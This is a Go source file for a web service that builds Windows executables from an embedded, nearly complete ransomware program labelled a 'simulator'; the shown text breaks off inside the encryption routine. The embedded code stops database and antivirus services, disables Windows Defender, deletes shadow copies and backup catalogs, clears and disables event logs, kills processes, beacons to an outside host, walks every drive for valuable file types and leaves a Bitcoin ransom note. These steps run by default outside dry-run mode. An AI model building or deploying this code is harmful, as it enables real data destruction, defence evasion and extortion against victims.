package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const listenAddr = ":8080"
const remoteAPIURL = "https://encrypt.yangzifun.org/E56dSY"

// htmlTemplate is the web page shown at GET /
const htmlTemplate = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>勒索软件模拟器 - 打包服务</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #1a1a2e; color: #eee; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .container { max-width: 700px; padding: 40px; text-align: center; }
        h1 { font-size: 2rem; margin-bottom: 10px; color: #e94560; }
        .subtitle { color: #888; margin-bottom: 30px; }
        .status-box { background: #16213e; border-radius: 12px; padding: 30px; margin: 20px 0; text-align: left; }
        .status-box h3 { color: #e94560; margin-bottom: 15px; }
        .log-area { background: #0f3460; border-radius: 8px; padding: 15px; min-height: 100px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 13px; line-height: 1.5; white-space: pre-wrap; word-break: break-all; }
        .btn { display: inline-block; padding: 14px 36px; border: none; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: all 0.2s; text-decoration: none; }
        .btn-primary { background: #e94560; color: #fff; }
        .btn-primary:hover { background: #d63851; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(233,69,96,0.4); }
        .btn-primary:disabled { background: #555; cursor: not-allowed; transform: none; box-shadow: none; }
        .btn-download { background: #0f3460; color: #e94560; border: 2px solid #e94560; margin-top: 20px; }
        .btn-download:hover { background: #e94560; color: #fff; }
        .hidden { display: none; }
        .info { color: #aaa; font-size: 0.9rem; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 勒索软件模拟器打包服务</h1>
        <p class="subtitle">点击下方按钮，自动获取密钥并生成绑架了密钥的 Windows 可执行文件</p>
        <div class="status-box">
            <h3>📋 打包日志</h3>
            <div class="log-area" id="log">等待操作...</div>
        </div>
        <button class="btn btn-primary" id="packBtn" onclick="startPack()">🚀 生成并下载 EXE</button>
        <div class="info">每次打包都会生成全新的 RSA 密钥对并嵌入到 exe 中</div>
    </div>

    <script>
    function appendLog(msg) {
        const el = document.getElementById('log');
        const time = new Date().toLocaleTimeString();
        el.textContent += '[' + time + '] ' + msg + '\n';
        el.scrollTop = el.scrollHeight;
    }

    async function startPack() {
        const btn = document.getElementById('packBtn');
        btn.disabled = true;
        btn.textContent = '⏳ 打包中...';
        appendLog('正在请求远程 API 获取密钥对...');

        try {
            // 1. Call remote API to get keys
            const keyResp = await fetch('/api/fetch-keys', { method: 'POST' });
            const keyData = await keyResp.json();
            if (keyData.status !== 'success') {
                throw new Error('获取密钥失败: ' + (keyData.message || keyResp.statusText));
            }
            appendLog('✅ 获取密钥成功，UUID: ' + keyData.uuid);

            // 2. Trigger pack
            appendLog('正在编译嵌入版 exe...');

            const packResp = await fetch('/api/pack', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uuid: keyData.uuid, public_key_pem: keyData.public_key_pem })
            });

            if (!packResp.ok) {
                const errData = await packResp.json();
                throw new Error(errData.error || '打包失败');
            }

            appendLog('✅ 编译成功，正在下载...');

            // 3. Download the exe
            const blob = await packResp.blob();
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'ransom_simulator_' + keyData.uuid.substring(0, 8) + '.exe';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            appendLog('✅ 下载完成！文件名: ' + a.download);
            btn.textContent = '✅ 打包完成，再次生成';
        } catch (err) {
            appendLog('❌ 错误: ' + err.message);
            btn.textContent = '🔄 重试生成';
        } finally {
            btn.disabled = false;
        }
    }
    </script>
</body>
</html>`

// ===========================================================================
// Embedded Source Template
// This is the complete ransomware simulator source code.
// It will be rendered with the UUID and PublicKeyPEM baked in as constants.
// The {{.BT}} placeholder is replaced with a backtick character during
// template execution (used for raw string literals in the generated source).
// ===========================================================================

const embeddedSourceTemplate = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	version   = "v3.2-Windows-Baked"
	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"
)

// Baked-in keys (injected by packer server)
const embeddedUUID = {{.BT}}{{.UUID}}{{.BT}}
const embeddedPublicKeyPEM = {{.BT}}{{.PublicKeyPEM}}{{.BT}}

const ransomNoteContent = {{.BT}}
==============================================================================
   !!! ATTENTION: YOUR FILES ARE ENCRYPTED / 注意：您的文件已被加密 !!!
==============================================================================

[ WARNING: Read the following carefully, or you may lose your data permanently ]
[ 警告：请仔细阅读以下内容，否则您可能永久丢失数据 ]

-------------------------------------------------------------------------------
ENGLISH version
-------------------------------------------------------------------------------

Q: What happened?
A: Your computers and servers have been locked by our security software. All your important files (including documents, photos, databases, SQL, backups, etc.) have been encrypted with strong algorithms. It is technically impossible to decrypt them without the private key held by us.

Attempts to modify or rename encrypted files may result in permanent data corruption.

Q: How to restore my files?
A: The only way to restore files is to purchase the decryption tool and private key from us.

1. Download and install Tor Browser (https://www.torproject.org/).
2. Visit our recovery page: [onion_address_placeholder]
3. Enter your unique Personal ID: %s

Payment Terms:
You must pay the ransom in Bitcoin. The price depends on how quickly you contact us.
- If you contact us within 72 hours, the price is: $X,XXX USD (BTC equivalent).
- If over 72 hours, the price will double.
- If we do not receive payment within 7 days, your decryption key will be deleted, and data will be lost permanently.

Free Decryption Test:
To prove that we can recover your files, you can send us 2 small non-important files (less than 1MB), and we will decrypt them for free.

Do not attempt to decrypt it yourself or use third-party software; this will cause permanent data loss.

-------------------------------------------------------------------------------
中文版本 (Chinese Version)
-------------------------------------------------------------------------------

问：发生了什么？
答：您的计算机和服务器已被我们的安全软件锁定。您所有的重要文件（包括文档、照片、数据库、SQL、备份等）都已被高强度算法加密。如果不使用我们持有的私钥，这在技术上是无法解密的。

试图修改或重命名加密文件可能会导致数据永久损坏。

问：如何恢复我的文件？
答：恢复文件的唯一方法是从我们这里购买解密工具和私钥。

1. 下载并安装 Tor 浏览器 (https://www.torproject.org/).
2. 访问我们的恢复页面: [此处为模拟的 .onion 地址]
3. 输入您的唯一个人ID: %s

付款条款：
您必须以比特币（Bitcoin）支付赎金。
价格取决于您与其联系的速度。
- 如果在 72 小时内联系我们，价格为：$X,XXX USD (BTC 等值)
- 如果超过 72 小时，价格将翻倍。
- 如果我们在 7 天内没有收到付款，您的解密密钥将被删除，数据将永久丢失。

免费解密测试：
为了证明我们可以恢复您的文件，您可以发送 2 个非重要的小文件（小于 1MB）给我们，我们将免费为您解密。

切勿尝试自行解密或使用第三方软件，这会导致数据永久丢失。

[攻击者组织名称/签名]

====================== [ 这是一次用于安全培训的模拟 ] ======================

不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，你的网络已经被完全攻陷。
本程序不会对加密的原文件进行删除操作，如遇原文件丢失，可通过下方链接获取私钥及解密程序：
https://encrypt.yangzifun.org/
获取私钥ID是: %s

项目链接：https://github.com/yangzifun/ransom_simulator
免责声明与许可
本项目遵循 MIT 许可证请查阅 LICENSE 文件了解详情。
再次强调，此工具的创建旨在赋能**防御者**，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。

{{.BT}}

var (
	lockFilePath       string
	ransomNoteFileName = "!!!_如何解密你的文件_!!!.txt"

	// 日志相关变量
	logEnabled        bool
	logDirectory      string
	successLogFile    *os.File
	failedLogFile     *os.File
	operationsLogFile *os.File

	// 公钥缓存，避免重复解析
	publicKeyCache     *rsa.PublicKey
	publicKeyCacheStr  string
	publicKeyCacheLock sync.RWMutex

	// 程序所在目录
	programDir string

	// 公钥变量
	publicKeyPEM string

	// 目标进程列表
	targetProcessesWindows = []string{
		"notepad.exe", "wordpad.exe", "winword.exe", "excel.exe", "powerpnt.exe",
		"mspaint.exe", "sqlservr.exe", "mysqld.exe", "oracle.exe", "outlook.exe",
		"thunderbird.exe", "steam.exe", "code.exe", "powershell.exe", "cmd.exe",
		"sqlwriter.exe", "sqlbrowser.exe", "mysql.exe", "pg_ctl.exe", "mongod.exe",
		"redis-server.exe", "oracle.exe", "sqlplus.exe",
		"mcshield.exe", "avp.exe", "bdagent.exe", "SophosUI.exe", "SEP.exe",
		"avastui.exe", "avgui.exe", "kav.exe", "kis.exe",
		"vssvc.exe", "wbengine.exe", "ntbackup.exe", "backupexec.exe",
	}

	windowsDatabaseServices = []string{
		"MSSQLSERVER", "SQLSERVERAGENT", "SQLWriter", "SQLBrowser",
		"MySQL80", "MySQL57", "PostgreSQL", "MongoDB",
		"Redis", "OracleServiceXE", "OracleServiceORCL",
	}

	windowsSecurityServices = []string{
		"WinDefend", "SecurityHealthService", "WdNisSvc", "Sense",
		"McAfeeFramework", "McShield", "SophosAgent", "SophosAlertService",
		"SEPMasterService", "SEPScanner", "SEPMonitoring", "AvastSvc",
		"AVGSvc", "Kaspersky Anti-Virus Service", "Kaspersky Security Center",
	}

	excludedDirsWindows = []string{
		"C:\\\\Windows", "C:\\\\Program Files", "C:\\\\Program Files (x86)",
		"System Volume Information", "$Recycle.Bin", "C:\\\\ProgramData",
		"C:\\\\System32", "C:\\\\SysWOW64", "C:\\\\Windows.old",
	}

	targetExtensions = []string{
		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
		".odt", ".csv", ".txt", ".rtf", ".md", ".tex", ".epub", ".one",
		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".tgz",
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff",
		".svg", ".webp", ".ico", ".psd", ".ai", ".eps",
		".sql", ".db", ".mdb", ".accdb", ".sqlite", ".sqlite3",
		".dbf", ".mdf", ".ndf", ".ldf", ".frm", ".ibd", ".myd",
		".myi", ".ibdata", ".ora", ".dmp", ".exp", ".imp", ".pdb",
		".wal", ".journal", ".rdb", ".aof", ".dump", ".backup",
		".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".json",
		".properties", ".env", ".toml", ".config",
		".bak", ".backup", ".old", ".temp", ".tmp", ".swp",
		".go", ".py", ".java", ".cpp", ".c", ".h", ".js", ".ts",
		".php", ".rb", ".pl", ".sh", ".bash", ".ps1", ".bat",
		".vmdk", ".vhd", ".vhdx", ".qcow2", ".ova", ".ovf",
		".dockerfile", ".dockerignore", ".vbox",
		".key", ".pem", ".crt", ".cer", ".pfx", ".p12",
		".pcap", ".log",
	}

	windowsDatabaseDataDirs = []string{
		"C:\\\\ProgramData\\\\MySQL\\\\MySQL Server\\\\Data",
		"C:\\\\Program Files\\\\MySQL\\\\MySQL Server\\\\Data",
		"C:\\\\Program Files (x86)\\\\MySQL\\\\MySQL Server\\\\Data",
		"C:\\\\Program Files\\\\PostgreSQL\\\\data",
		"C:\\\\Program Files (x86)\\\\PostgreSQL\\\\data",
		"C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL\\\\DATA",
		"C:\\\\Program Files (x86)\\\\Microsoft SQL Server\\\\MSSQL\\\\DATA",
		"C:\\\\MongoDB\\\\data",
		"D:\\\\MongoDB\\\\data",
		"C:\\\\Redis\\\\data",
		"C:\\\\Oracle\\\\oradata",
		"D:\\\\Oracle\\\\oradata",
	}
)

type fileLog struct {
	mu   sync.Mutex
	file *os.File
}

type counters struct {
	success atomic.Uint64
	failed  atomic.Uint64
}

func main() {
	forceReleaseLock()

	fmt.Println("==================================================")
	fmt.Println("      勒索软件模拟器 - Windows增强版（嵌入式密钥）")
	fmt.Printf("                版本: %s\n", version)
	fmt.Println("==================================================")
	time.Sleep(1 * time.Second)

	initProgramDir()

	fmt.Println("\\n[阶段 1: 渗透与持久化]")
	fmt.Print("[*] 通过互斥锁建立持久化... ")
	if !createSingleInstanceLock() {
		fmt.Println("失败. [IOC] 检测到另一个实例正在运行。程序终止。")
		os.Exit(1)
	}
	fmt.Println("成功.")
	defer cleanupLockFile()

	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag, logFlag := setupFlags(fs)
	if err := fs.Parse(os.Args[1:]); err != nil {
		_, _ = fmt.Fprintf(os.Stderr, "错误: 解析命令行参数失败: %v\\n", err)
		os.Exit(1)
	}

	initLogging(*logFlag)
	defer closeLogFiles()

	showWarning(*dryRunFlag)
	fmt.Println("\\n[阶段 2: 防御规避与发现]")
	if *dryRunFlag {
		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
	} else {
		go networkBeacon()

		fmt.Println("\\n[+] 停止数据库和安全服务...")
		stopWindowsServices()

		fmt.Println("\\n[+] 清理数据库内存和缓存...")
		cleanWindowsDatabaseMemory()

		killLockingProcesses()
		simulateDestructiveActions()
	}

	extFilter := make(map[string]bool)
	if *extensionsFlag != "" {
		exts := strings.Split(*extensionsFlag, ",")
		for _, ext := range exts {
			ext = strings.TrimSpace(ext)
			if ext != "" {
				if !strings.HasPrefix(ext, ".") {
					ext = "." + ext
				}
				extFilter[strings.ToLower(ext)] = true
			}
		}
		fmt.Printf("[*] 使用指定的扩展名: %v\\n", getKeys(extFilter))
	} else {
		for _, ext := range targetExtensions {
			extFilter[ext] = true
		}
		fmt.Println("[*] 使用增强扩展名列表 (包含数据库文件、配置文件、备份文件等)")
	}

	var scanRoots []string
	encryptAllFormats := false
	if *directoryFlag != "" {
		dirs := strings.Split(*directoryFlag, ",")
		for _, dir := range dirs {
			dir = strings.TrimSpace(dir)
			if dir != "" {
				scanRoots = append(scanRoots, dir)
			}
		}
		fmt.Printf("[*] 扫描指定目录: %v\\n", scanRoots)
		if len(scanRoots) > 0 {
			encryptAllFormats = true
			fmt.Println("[*] 目录定位模式已激活: 将加密指定目录下的【所有格式】文件")
		}
	}

	fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
	filesToProcess := scanFiles(extFilter, scanRoots, encryptAllFormats)
	if len(filesToProcess) == 0 {
		fmt.Println("[!] 未找到任何有价值的目标文件。任务中止。")
		os.Exit(0)
	}
	fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\\n", len(filesToProcess))

	var stats counters
	var finalUUID = embeddedUUID

	if *dryRunFlag {
		fmt.Println("\\n[阶段 3: 载荷部署 (演习模式下跳过)]")
		fmt.Println("[*] 以下文件在真实攻击中将被加密:")
		for _, f := range filesToProcess {
			fmt.Println("  -", f)
		}
	} else {
		fmt.Println("\\n[阶段 3: 载荷部署]")
		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\\n", *workersFlag)
		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, finalUUID, *removeFlag)
		fmt.Println("\\n[+] 载荷执行完毕。")
	}

	if !*dryRunFlag {
		fmt.Println("\\n[阶段 4: 勒索信增强]")
		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID, finalUUID, finalUUID)
		userProfile, err := os.UserHomeDir()
		if err == nil {
			desktopPath := filepath.Join(userProfile, "Desktop")
			_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
		}
		createRansomWallpaper()
	}

	fmt.Println("\\n================== [ 任务完成 ] ==================")
	if *dryRunFlag {
		fmt.Printf("  - 模式:            演习模式 (Dry Run)\\n")
		fmt.Printf("  - 发现目标:        %d\\n", len(filesToProcess))
	} else {
		fmt.Printf("  - 模式:            实时攻击\\n")
		fmt.Printf("  - 已加密文件:      %d\\n", stats.success.Load())
		fmt.Printf("  - 加密失败:        %d\\n", stats.failed.Load())
	}

	if logEnabled {
		fmt.Println("\\n================== [ 日志文件 ] ==================")
		fmt.Printf("  - 成功日志:        %s\\n", filepath.Join(logDirectory, "success_encrypted.log"))
		fmt.Printf("  - 失败日志:        %s\\n", filepath.Join(logDirectory, "failed_encrypted.log"))
		fmt.Printf("  - 操作日志:        %s\\n", filepath.Join(logDirectory, "operations.log"))
		fmt.Println("====================================================")
	}

	countdown("此终端将在", 10)
}

func initProgramDir() {
	exePath, err := os.Executable()
	if err != nil {
		programDir, _ = os.Getwd()
		fmt.Printf("[!] 警告: 无法获取程序路径，使用当前工作目录: %s\\n", programDir)
	} else {
		programDir = filepath.Dir(exePath)
		fmt.Printf("[*] 程序所在目录: %s\\n", programDir)
	}
}

func initLogging(enableLog bool) {
	logEnabled = enableLog
	if !logEnabled {
		return
	}
	logDirectory = programDir
	fmt.Printf("[*] 日志系统已启用，日志将输出到: %s\\n", logDirectory)
	var err1, err2, err3 error
	successLogFile, err1 = os.OpenFile(
		filepath.Join(logDirectory, "success_encrypted.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644,
	)
	failedLogFile, err2 = os.OpenFile(
		filepath.Join(logDirectory, "failed_encrypted.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644,
	)
	operationsLogFile, err3 = os.OpenFile(
		filepath.Join(logDirectory, "operations.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644,
	)
	if err1 != nil || err2 != nil || err3 != nil {
		fmt.Printf("[!] 无法创建日志文件: success=%v, failed=%v, operations=%v\\n", err1, err2, err3)
		logEnabled = false
	} else {
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		header := fmt.Sprintf("=================== 勒索软件模拟器日志 ===================\\n")
		header += fmt.Sprintf("程序版本: %s\\n", version)
		header += fmt.Sprintf("开始时间: %s\\n", timestamp)
		header += fmt.Sprintf("运行参数: %s\\n", strings.Join(os.Args, " "))
		header += fmt.Sprintf("工作目录: %s\\n", programDir)
		header += fmt.Sprintf("=========================================================\\n\\n")
		_, _ = successLogFile.WriteString(header)
		_, _ = failedLogFile.WriteString(header)
		_, _ = operationsLogFile.WriteString(header)
	}
}

func closeLogFiles() {
	if logEnabled {
		if successLogFile != nil { _ = successLogFile.Close() }
		if failedLogFile != nil { _ = failedLogFile.Close() }
		if operationsLogFile != nil { _ = operationsLogFile.Close() }
	}
}

func logSuccess(filePath string) {
	if !logEnabled || successLogFile == nil { return }
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] SUCCESS: %s -> %s.encrypted\\n", timestamp, filePath, filePath)
	successLogFile.WriteString(logEntry)
	logOperation(fmt.Sprintf("成功加密: %s", filePath))
}

func logFailed(filePath string, errorMsg string) {
	if !logEnabled || failedLogFile == nil { return }
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] FAILED: %s - %s\\n", timestamp, filePath, errorMsg)
	failedLogFile.WriteString(logEntry)
	logOperation(fmt.Sprintf("加密失败: %s - %s", filePath, errorMsg))
}

func logOperation(message string) {
	if !logEnabled || operationsLogFile == nil { return }
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] %s\\n", timestamp, message)
	operationsLogFile.WriteString(logEntry)
}

func getPublicKey(publicKeyStr string) (*rsa.PublicKey, error) {
	publicKeyCacheLock.RLock()
	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
		publicKeyCacheLock.RUnlock()
		return publicKeyCache, nil
	}
	publicKeyCacheLock.RUnlock()

	publicKeyCacheLock.Lock()
	defer publicKeyCacheLock.Unlock()

	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
		return publicKeyCache, nil
	}

	cleanedKeyStr := strings.TrimSpace(publicKeyStr)
	if !strings.HasPrefix(cleanedKeyStr, "-----BEGIN") {
		cleanedKeyStr = fmt.Sprintf("-----BEGIN PUBLIC KEY-----\\n%s\\n-----END PUBLIC KEY-----", cleanedKeyStr)
	}

	pemBlock, _ := pem.Decode([]byte(cleanedKeyStr))
	if pemBlock == nil {
		if strings.Contains(cleanedKeyStr, "RSA PUBLIC KEY") {
			cleanedKeyStr = strings.Replace(cleanedKeyStr, "RSA PUBLIC KEY", "PUBLIC KEY", 1)
			pemBlock, _ = pem.Decode([]byte(cleanedKeyStr))
		}
		if pemBlock == nil {
			return nil, fmt.Errorf("解码PEM公钥失败: 无效的PEM格式")
		}
	}

	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		pub, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes)
		if err != nil {
			return nil, fmt.Errorf("解析公钥失败: %w", err)
		}
	}

	rsaPubKey, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("公钥不是RSA类型")
	}

	publicKeyCache = rsaPubKey
	publicKeyCacheStr = publicKeyStr
	return rsaPubKey, nil
}

func stopWindowsServices() {
	if logEnabled { logOperation("开始停止Windows服务") }
	for _, service := range windowsDatabaseServices {
		fmt.Printf("  - 停止数据库服务: %s\\n", service)
		if logEnabled { logOperation(fmt.Sprintf("尝试停止数据库服务: %s", service)) }
		cmd := exec.Command("sc", "stop", service); _ = cmd.Run()
		cmd = exec.Command("net", "stop", service); _ = cmd.Run()
		cmd = exec.Command("sc", "config", service, "start=", "disabled"); _ = cmd.Run()
		time.Sleep(100 * time.Millisecond)
	}
	for _, service := range windowsSecurityServices {
		fmt.Printf("  - 停止安全服务: %s\\n", service)
		if logEnabled { logOperation(fmt.Sprintf("尝试停止安全服务: %s", service)) }
		cmd := exec.Command("sc", "stop", service); _ = cmd.Run()
		cmd = exec.Command("net", "stop", service); _ = cmd.Run()
		serviceExe := strings.ToLower(service)
		cmd = exec.Command("taskkill", "/F", "/IM", serviceExe+".exe"); _ = cmd.Run()
		time.Sleep(100 * time.Millisecond)
	}
	fmt.Println("  - 停止Windows Defender...")
	if logEnabled { logOperation("尝试停止Windows Defender") }
	cmd := exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"); _ = cmd.Run()
	cmd = exec.Command("powershell", "-Command", "Set-MpPreference -DisableScanning $true"); _ = cmd.Run()
	if logEnabled { logOperation("Windows服务停止完成") }
}

func cleanWindowsDatabaseMemory() {
	if logEnabled { logOperation("开始清理Windows数据库内存和缓存") }
	fmt.Println("  - 清理SQL Server缓存...")
	if logEnabled { logOperation("清理SQL Server缓存") }
	cleanSQLServerCache()
	fmt.Println("  - 清理系统内存...")
	if logEnabled { logOperation("清理系统内存") }
	cmd := exec.Command("powershell", "-Command", "Clear-EventLog -LogName Application, System, Security"); _ = cmd.Run()
	cmd = exec.Command("ipconfig", "/flushdns"); _ = cmd.Run()
	if logEnabled { logOperation("Windows数据库内存和缓存清理完成") }
}

func cleanSQLServerCache() {
	cleanCommands := []string{
		"DBCC DROPCLEANBUFFERS",
		"DBCC FREEPROCCACHE",
		"DBCC FREESYSTEMCACHE ('ALL')",
		"DBCC FREESESSIONCACHE",
	}
	for _, sqlCmd := range cleanCommands {
		cmd := exec.Command("sqlcmd", "-Q", sqlCmd); _ = cmd.Run()
	}
}

func killLockingProcesses() {
	fmt.Println("\\n[+] 终止占用文件的进程...")
	if logEnabled { logOperation("开始终止占用文件的进程") }
	for _, proc := range targetProcessesWindows {
		fmt.Printf("  - 终止进程: %s\\n", proc)
		if logEnabled { logOperation(fmt.Sprintf("尝试终止进程: %s", proc)) }
		cmd := exec.Command("taskkill", "/F", "/IM", proc); _ = cmd.Run()
	}
	time.Sleep(1 * time.Second)
	if logEnabled { logOperation("进程终止完成") }
}

func forceReleaseLock() {
	lockPath := filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
	_ = os.Remove(lockPath)
}

func createSingleInstanceLock() bool {
	lockFilePath = filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
	file, err := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL, 0666)
	if err != nil { return false }
	_ = file.Close()
	return true
}

func cleanupLockFile() {
	if lockFilePath != "" { _ = os.Remove(lockFilePath) }
}

func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool) {
	workers := fs.Int("workers", runtime.NumCPU(), "并发 worker 数量")
	dryRun := fs.Bool("dry-run", false, "演习模式")
	extensions := fs.String("ext", "", "指定要加密的文件扩展名 (e.g., '.txt,.pdf')")
	directory := fs.String("dir", "", "指定目标 (目录或单个文件); 将忽略扩展名限制")
	removeOriginal := fs.Bool("remove", false, "加密后删除原文件")
	logFlag := fs.Bool("log", false, "启用日志功能，在程序所在目录输出日志文件")
	fs.Usage = func() {
		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\\n", os.Args[0])
		_, _ = fmt.Fprintf(os.Stderr, "本版本使用嵌入式密钥（由打包服务注入），无需网络连接\\n")
		fs.PrintDefaults()
	}
	return workers, dryRun, extensions, directory, removeOriginal, logFlag
}

func showWarning(dryRun bool) {
	_, _ = fmt.Fprintf(os.Stderr, "\\n************************** 警告 **************************\\n")
	_, _ = fmt.Fprintf(os.Stderr, "此程序将自动扫描并加密指定范围内的文件。\\n")
	_, _ = fmt.Fprintf(os.Stderr, "这是一个高度危险的模拟，请确保在隔离的环境中运行！\\n")
	_, _ = fmt.Fprintf(os.Stderr, "**********************************************************\\n\\n")
	if dryRun {
		fmt.Println(">>> 已激活 [演习模式 (Dry Run)]，不会执行任何加密操作。")
	} else {
		fmt.Println(">>> 警告: 实时攻击模式已激活！将在 3 秒后自动开始...")
		time.Sleep(3 * time.Second)
	}
}

func countdown(message string, seconds int) {
	fmt.Println()
	for i := seconds; i >= 0; i-- {
		fmt.Printf("\\r%s %d 秒后自动退出...", message, i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println("\\r程序已退出。                                  ")
}

func networkBeacon() {
	time.Sleep(3 * time.Second)
	client := http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(beaconURL)
	if err != nil { return }
	defer func() { _ = resp.Body.Close() }()
}

func simulateDestructiveActions() {
	time.Sleep(1 * time.Second)
	fmt.Println("\\n[+] 执行破坏性操作...")
	fmt.Println("  - [IOC] 模拟: 清除 Shadow Copies...")
	if logEnabled { logOperation("开始执行破坏性操作：清除Shadow Copies") }
	cmd := exec.Command("vssadmin", "delete", "shadows", "/for=C:", "/all", "/quiet"); _ = cmd.Run()
	fmt.Println("  - [IOC] 模拟: 清除系统备份...")
	cmd = exec.Command("wbadmin", "delete", "catalog", "-quiet"); _ = cmd.Run()
	fmt.Println("  - [IOC] 模拟: 清除系统安全日志...")
	if logEnabled { logOperation("清除系统安全日志") }
	cmd = exec.Command("wevtutil", "cl", "Application"); _ = cmd.Run()
	cmd = exec.Command("wevtutil", "cl", "System"); _ = cmd.Run()
	cmd = exec.Command("wevtutil", "cl", "Security"); _ = cmd.Run()
	cmd = exec.Command("sc", "config", "EventLog", "start=", "disabled"); _ = cmd.Run()
	cmd = exec.Command("sc", "stop", "EventLog"); _ = cmd.Run()
	if logEnabled { logOperation("破坏性操作完成") }
	time.Sleep(1 * time.Second)
}

func createRansomWallpaper() {
	fmt.Println("[*] Windows壁纸修改功能(模拟)")
	if logEnabled { logOperation("尝试修改壁纸") }
	wallpaperCommands := []string{
		"reg add \"HKCU\\\\Control Panel\\\\Desktop\" /v Wallpaper /t REG_SZ /d \"C:\\\\Windows\\\\Web\\\\Wallpaper\\\\Windows\\\\img0.jpg\" /f",
		"powershell -Command \"Set-ItemProperty -Path 'HKCU:\\Control Panel:\\Desktop' -Name Wallpaper -Value 'C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg'\"",
	}
	for _, cmdStr := range wallpaperCommands {
		cmd := exec.Command("cmd", "/C", cmdStr); _ = cmd.Run()
	}
}

func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats bool) []string {
	var filesToProcess []string
	var roots []string
	if len(scanRoots) > 0 {
		roots = scanRoots
	} else {
		for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
			drivePath := string(drive) + ":\\\\"
			if _, err := os.Stat(drivePath); err == nil {
				roots = append(roots, drivePath)
			}
		}
	}
	for _, dbDir := range windowsDatabaseDataDirs {
		if _, err := os.Stat(dbDir); err == nil {
			roots = append(roots, dbDir)
		}
	}
	fmt.Printf("[*] 扫描根目录: %v\\n", roots)
	if logEnabled { logOperation(fmt.Sprintf("开始扫描文件，根目录: %v", roots)) }

	for _, root := range roots {
		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil { return nil }
			if info.IsDir() {
				if isExcluded(path) { return filepath.SkipDir }
				return nil
			}
			shouldProcess := false
			if encryptAllFormats {
				shouldProcess = true
				fileName := filepath.Base(path)
				if fileName == ransomNoteFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(filepath.Ext(fileName), ".encrypted") {
					shouldProcess = false
				}
			} else {
				shouldProcess = shouldEncrypt(path, extFilter)
			}
			if shouldProcess {
				filesToProcess = append(filesToProcess, path)
			}
			return nil
		})
	}
	if logEnabled { logOperation(fmt.Sprintf("扫描完成，找到 %d 个待加密文件", len(filesToProcess))) }
	return filesToProcess
}

func shouldEncrypt(path string, extFilter map[string]bool) bool {
	ext := strings.ToLower(filepath.Ext(path))
	return extFilter[ext]
}

func isExcluded(path string) bool {
	for _, excluded := range excludedDirsWindows {
		if strings.HasPrefix(path, excluded) {
			return true
		}
	}
	return false
}

func runEncryptionWorkers(files []string, numWorkers int, stats *counters, uuid string, removeOriginal bool) {
	// Use embedded public key directly
	publicKeyPEM = embeddedPublicKeyPEM
	fmt.Printf("[*] 使用嵌入式密钥，UUID: %s\\n", uuid)

	fmt.Print("[*] 预解析公钥... ")
